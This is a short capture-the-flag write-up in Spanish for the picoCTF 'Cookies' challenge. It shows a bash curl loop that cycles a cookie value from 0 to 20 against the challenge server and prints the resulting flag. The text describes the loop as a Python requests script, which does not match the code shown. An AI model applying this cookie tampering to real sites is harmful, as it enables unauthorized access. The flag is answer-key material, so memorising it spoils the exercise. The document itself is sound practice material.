## Descripción
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:54219/](http://mercury.picoctf.net:54219/)

## Solución
Mirando el conjunto de cookies después de ingresar snickerdoodle, vemos que tiene un valor de 0. Al probar y cambiar el valor de la cookie a 1, 2, etc., vemos que genera un nombre diferente. Supongo que un cierto valor de cookie nos devolverá la bandera.
Este script usa solicitudes de python para recorrer del 1 al 20 y configurarlo como nuestra cookie. Luego enviamos la solicitud de publicación y vemos qué devuelve.
```
┌──(diego㉿kali)-[~]
└─$ for i in {0..20}; do curl -s http://mercury.picoctf.net:27177/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_064663be}</code></p>
          
```
Tenemos la bandera

## Bandera
picoCTF{3v3ry1_l0v3s_c00k135_064663be}
